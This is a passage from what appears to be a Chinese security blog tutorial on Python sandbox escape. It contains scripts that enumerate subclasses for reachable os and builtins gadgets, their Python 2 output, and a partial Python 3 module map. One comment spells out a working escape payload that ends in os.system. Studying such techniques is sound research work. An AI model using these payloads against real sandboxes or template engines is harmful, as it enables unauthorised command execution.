class="line">                                    print(i, j, sub, f, target)</div><div class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">                    <span class="keyword">pass</span></div><div class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">        <span class="keyword">pass</span></div><div class="line"></div><div class="line">print(<span class="string">'----------4-----------'</span>)</div><div class="line"><span class="comment"># 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']("os").system("ls")</span></div><div class="line"><span class="comment"># &lt;class 'warnings.catch_warnings'&gt;类很特殊，在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似</span></div><div class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> enumerate(subclasses):</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        more = sub()._module.__builtins__</div><div class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</div><div class="line">            <span class="keyword">if</span> f <span class="keyword">in</span> more:</div><div class="line">                print(i, f)</div><div class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">        <span class="keyword">pass</span></div></pre></td></tr></table></figure></li><li><p>在Python 2.7.12，Ubuntu 16.04的环境上运行结果如下：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line">----------1-----------</div><div class="line">(<span class="number">40</span>, 'file')</div><div class="line">----------2-----------</div><div class="line">(<span class="number">58</span>, &lt;class 'warnings.WarningMessage'&gt;, 'linecache', ['os', 'sys', '__builtins__'])</div><div class="line">(<span class="number">58</span>, &lt;class 'warnings.WarningMessage'&gt;, 'sys', None)</div><div class="line">(<span class="number">58</span>, &lt;class 'warnings.WarningMessage'&gt;, '__builtins__', None)</div><div class="line">(<span class="number">58</span>, &lt;class 'warnings.WarningMessage'&gt;, 'types', ['__builtins__'])</div><div class="line">(<span class="number">59</span>, &lt;class 'warnings.catch_warnings'&gt;, 'linecache', ['os', 'sys', '__builtins__'])</div><div class="line">(<span class="number">59</span>, &lt;class 'warnings.catch_warnings'&gt;, 'sys', None)</div><div class="line">(<span class="number">59</span>, &lt;class 'warnings.catch_warnings'&gt;, '__builtins__', None)</div><div class="line">(<span class="number">59</span>, &lt;class 'warnings.catch_warnings'&gt;, 'types', ['__builtins__'])</div><div class="line">(<span class="number">60</span>, &lt;class '_weakrefset._IterationGuard'&gt;, '__builtins__', None)</div><div class="line">(<span class="number">61</span>, &lt;class '_weakrefset.WeakSet'&gt;, '__builtins__', None)</div><div class="line">(<span class="number">71</span>, &lt;class 'site._Printer'&gt;, 'traceback', ['sys', '__builtins__'])</div><div class="line">(<span class="number">71</span>, &lt;class 'site._Printer'&gt;, 'os', ['sys', '__builtins__', 'open'])</div><div class="line">(<span class="number">71</span>, &lt;class 'site._Printer'&gt;, 'sys', None)</div><div class="line">(<span class="number">71</span>, &lt;class 'site._Printer'&gt;, '__builtins__', None)</div><div class="line">(<span class="number">76</span>, &lt;class 'site.Quitter'&gt;, 'traceback', ['sys', '__builtins__'])</div><div class="line">(<span class="number">76</span>, &lt;class 'site.Quitter'&gt;, 'os', ['sys', '__builtins__', 'open'])</div><div class="line">(<span class="number">76</span>, &lt;class 'site.Quitter'&gt;, 'sys', None)</div><div class="line">(<span class="number">76</span>, &lt;class 'site.Quitter'&gt;, '__builtins__', None)</div><div class="line">(<span class="number">77</span>, &lt;class 'codecs.IncrementalEncoder'&gt;, 'sys', None)</div><div class="line">(<span class="number">77</span>, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open', None)</div><div class="line">(<span class="number">77</span>, &lt;class 'codecs.IncrementalEncoder'&gt;, '__builtins__', None)</div><div class="line">(<span class="number">78</span>, &lt;class 'codecs.IncrementalDecoder'&gt;, 'sys', None)</div><div class="line">(<span class="number">78</span>, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open', None)</div><div class="line">(<span class="number">78</span>, &lt;class 'codecs.IncrementalDecoder'&gt;, '__builtins__', None)</div><div class="line">----------3-----------</div><div class="line">(<span class="number">58</span>, <span class="number">13</span>, &lt;class 'warnings.WarningMessage'&gt;, '__import__')</div><div class="line">(<span class="number">58</span>, <span class="number">13</span>, &lt;class 'warnings.WarningMessage'&gt;, 'file')</div><div class="line">(<span class="number">58</span>, <span class="number">13</span>, &lt;class 'warnings.WarningMessage'&gt;, 'compile')</div><div class="line">(<span class="number">58</span>, <span class="number">13</span>, &lt;class 'warnings.WarningMessage'&gt;, 'eval')</div><div class="line">(<span class="number">58</span>, <span class="number">13</span>, &lt;class 'warnings.WarningMessage'&gt;, 'open')</div><div class="line">(<span class="number">58</span>, <span class="number">13</span>, &lt;class 'warnings.WarningMessage'&gt;, 'execfile')</div><div class="line">(<span class="number">59</span>, <span class="number">13</span>, &lt;class 'warnings.catch_warnings'&gt;, '__import__')</div><div class="line">(<span class="number">59</span>, <span class="number">13</span>, &lt;class 'warnings.catch_warnings'&gt;, 'file')</div><div class="line">(<span class="number">59</span>, <span class="number">13</span>, &lt;class 'warnings.catch_warnings'&gt;, 'compile')</div><div class="line">(<span class="number">59</span>, <span class="number">13</span>, &lt;class 'warnings.catch_warnings'&gt;, 'eval')</div><div class="line">(<span class="number">59</span>, <span class="number">13</span>, &lt;class 'warnings.catch_warnings'&gt;, 'open')</div><div class="line">(<span class="number">59</span>, <span class="number">13</span>, &lt;class 'warnings.catch_warnings'&gt;, 'execfile')</div><div class="line">(<span class="number">60</span>, <span class="number">1</span>, &lt;class '_weakrefset._IterationGuard'&gt;, '__import__')</div><div class="line">(<span class="number">60</span>, <span class="number">1</span>, &lt;class '_weakrefset._IterationGuard'&gt;, 'file')</div><div class="line">(<span class="number">60</span>, <span class="number">1</span>, &lt;class '_weakrefset._IterationGuard'&gt;, 'compile')</div><div class="line">(<span class="number">60</span>, <span class="number">1</span>, &lt;class '_weakrefset._IterationGuard'&gt;, 'eval')</div><div class="line">(<span class="number">60</span>, <span class="number">1</span>, &lt;class '_weakrefset._IterationGuard'&gt;, 'open')</div><div class="line">(<span class="number">60</span>, <span class="number">1</span>, &lt;class '_weakrefset._IterationGuard'&gt;, 'execfile')</div><div class="line">(<span class="number">61</span>, <span class="number">1</span>, &lt;class '_weakrefset.WeakSet'&gt;, '__import__')</div><div class="line">(<span class="number">61</span>, <span class="number">1</span>, &lt;class '_weakrefset.WeakSet'&gt;, 'file')</div><div class="line">(<span class="number">61</span>, <span class="number">1</span>, &lt;class '_weakrefset.WeakSet'&gt;, 'compile')</div><div class="line">(<span class="number">61</span>, <span class="number">1</span>, &lt;class '_weakrefset.WeakSet'&gt;, 'eval')</div><div class="line">(<span class="number">61</span>, <span class="number">1</span>, &lt;class '_weakrefset.WeakSet'&gt;, 'open')</div><div class="line">(<span class="number">61</span>, <span class="number">1</span>, &lt;class '_weakrefset.WeakSet'&gt;, 'execfile')</div><div class="line">(<span class="number">71</span>, <span class="number">19</span>, &lt;class 'site._Printer'&gt;, 'file')</div><div class="line">(<span class="number">71</span>, <span class="number">19</span>, &lt;class 'site._Printer'&gt;, 'exec')</div><div class="line">(<span class="number">71</span>, <span class="number">22</span>, &lt;class 'site._Printer'&gt;, '__import__')</div><div class="line">(<span class="number">71</span>, <span class="number">22</span>, &lt;class 'site._Printer'&gt;, 'file')</div><div class="line">(<span class="number">71</span>, <span class="number">22</span>, &lt;class 'site._Printer'&gt;, 'compile')</div><div class="line">(<span class="number">71</span>, <span class="number">22</span>, &lt;class 'site._Printer'&gt;, 'eval')</div><div class="line">(<span class="number">71</span>, <span class="number">22</span>, &lt;class 'site._Printer'&gt;, 'open')</div><div class="line">(<span class="number">71</span>, <span class="number">22</span>, &lt;class 'site._Printer'&gt;, 'execfile')</div><div class="line">(<span class="number">76</span>, <span class="number">19</span>, &lt;class 'site.Quitter'&gt;, 'file')</div><div class="line">(<span class="number">76</span>, <span class="number">19</span>, &lt;class 'site.Quitter'&gt;, 'exec')</div><div class="line">(<span class="number">76</span>, <span class="number">22</span>, &lt;class 'site.Quitter'&gt;, '__import__')</div><div class="line">(<span class="number">76</span>, <span class="number">22</span>, &lt;class 'site.Quitter'&gt;, 'file')</div><div class="line">(<span class="number">76</span>, <span class="number">22</span>, &lt;class 'site.Quitter'&gt;, 'compile')</div><div class="line">(<span class="number">76</span>, <span class="number">22</span>, &lt;class 'site.Quitter'&gt;, 'eval')</div><div class="line">(<span class="number">76</span>, <span class="number">22</span>, &lt;class 'site.Quitter'&gt;, 'open')</div><div class="line">(<span class="number">76</span>, <span class="number">22</span>, &lt;class 'site.Quitter'&gt;, 'execfile')</div><div class="line">(<span class="number">77</span>, <span class="number">20</span>, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open')</div><div class="line">(<span class="number">77</span>, <span class="number">22</span>, &lt;class 'codecs.IncrementalEncoder'&gt;, '__import__')</div><div class="line">(<span class="number">77</span>, <span class="number">22</span>, &lt;class 'codecs.IncrementalEncoder'&gt;, 'file')</div><div class="line">(<span class="number">77</span>, <span class="number">22</span>, &lt;class 'codecs.IncrementalEncoder'&gt;, 'compile')</div><div class="line">(<span class="number">77</span>, <span class="number">22</span>, &lt;class 'codecs.IncrementalEncoder'&gt;, 'eval')</div><div class="line">(<span class="number">77</span>, <span class="number">22</span>, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open')</div><div class="line">(<span class="number">77</span>, <span class="number">22</span>, &lt;class 'codecs.IncrementalEncoder'&gt;, 'execfile')</div><div class="line">(<span class="number">78</span>, <span class="number">20</span>, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open')</div><div class="line">(<span class="number">78</span>, <span class="number">22</span>, &lt;class 'codecs.IncrementalDecoder'&gt;, '__import__')</div><div class="line">(<span class="number">78</span>, <span class="number">22</span>, &lt;class 'codecs.IncrementalDecoder'&gt;, 'file')</div><div class="line">(<span class="number">78</span>, <span class="number">22</span>, &lt;class 'codecs.IncrementalDecoder'&gt;, 'compile')</div><div class="line">(<span class="number">78</span>, <span class="number">22</span>, &lt;class 'codecs.IncrementalDecoder'&gt;, 'eval')</div><div class="line">(<span class="number">78</span>, <span class="number">22</span>, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open')</div><div class="line">(<span class="number">78</span>, <span class="number">22</span>, &lt;class 'codecs.IncrementalDecoder'&gt;, 'execfile')</div><div class="line">----------4-----------</div><div class="line">(<span class="number">59</span>, '__import__')</div><div class="line">(<span class="number">59</span>, 'file')</div><div class="line">(<span class="number">59</span>, 'repr')</div><div class="line">(<span class="number">59</span>, 'compile')</div><div class="line">(<span class="number">59</span>, 'eval')</div><div class="line">(<span class="number">59</span>, 'open')</div><div class="line">(<span class="number">59</span>, 'execfile')</div></pre></td></tr></table></figure></li><li><p>可以看到在Python2中，可以利用的模块和函数还是相当多的。Python3中有一些变动，func<em>globals被</em> <em> globals </em> _替代，下面是遍历Python3中的代码：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div></pre></td><td class="code"><pre><div class="line"># coding=<span class="symbol">UTF</span><span class="number">-8</span></div><div class="line"># <span class="symbol">Python3</span></div><div class="line"></div><div class="line">find_modules = &#123;<span class="string">'asyncio'</span>: [<span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'collections'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'concurrent'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ctypes'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'curses'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'dbm'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'distutils'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'email'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'encodings'</span>: [<span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'ensurepip'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'html'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'http'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'idlelib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'importlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__import__'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'json'</span>: [<span class="string">'codecs'</span>, <span class="string">'__builtins__'</span>], <span class="string">'lib2to3'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'logging'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'msilib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'multiprocessing'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pydoc_data'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sqlite3'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'test'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'tkinter'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'turtledemo'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'unittest'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'urllib'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'venv'</span>: [<span class="string">'os'</span>, <span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'wsgiref'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'xml'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'xmlrpc'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'__future__'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'__phello__.foo'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_bootlocale'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'_collections_abc'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'_compat_pickle'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'_compression'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_dummy_thread'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_markupbase'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'_osx_support'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'_pydecimal'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'_pyio'</span>: [<span class="string">'os'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'_sitebuiltins'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'_strptime'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_threading_local'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_weakrefset'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'abc'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'aifc'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'antigravity'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'argparse'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ast'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'asynchat'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'asyncore'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'base64'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'bdb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'binhex'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'bisect'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'bz2'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'cProfile'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'calendar'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'cgi'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'cgitb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'chunk'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'cmd'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'code'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'codecs'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'codeop'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'colorsys'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'compileall'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'configparser'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'contextlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'copy'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'copyreg'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'crypt'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'csv'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'datetime'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'decimal'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'difflib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'dis'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'doctest'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'dummy_threading'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'enum'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'filecmp'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'fileinput'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'fnmatch'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'formatter'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'fractions'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'ftplib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'functools'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'genericpath'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'getopt'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'getpass'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'gettext'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'glob'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'gzip'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'hashlib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'heapq'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'hmac'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'imaplib'</span>: [<span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'imghdr'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'imp'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'inspect'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'io'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</div><div class="line">                <span class="string">'ipaddress'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'keyword'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'linecache'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'locale'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'lzma'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</div><div class="line">                <span class="string">'macpath'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'macurl2path'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'mailbox'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'mailcap'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'mimetypes'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'modulefinder'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'netrc'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'nntplib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ntpath'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'nturl2path'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'numbers'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'opcode'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'operator'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'optparse'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'os'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'pathlib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'pdb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pickle'</span>: [<span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'pickletools'</span>: [<span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pipes'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'pkgutil'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'platform'</span>: [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'plistlib'</span>: [<span class="string">'os'</span>, <span class="string">'codecs'</span>, <span class="string">'__builtins__'</span>], <span class="string">'poplib'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'posixpath'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pprint'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'profile'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pstats'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'pty'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'py_compile'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</div><div class="line">                <span class="string">'pyclbr'</span>: [<span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'pydoc'</span>: [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span 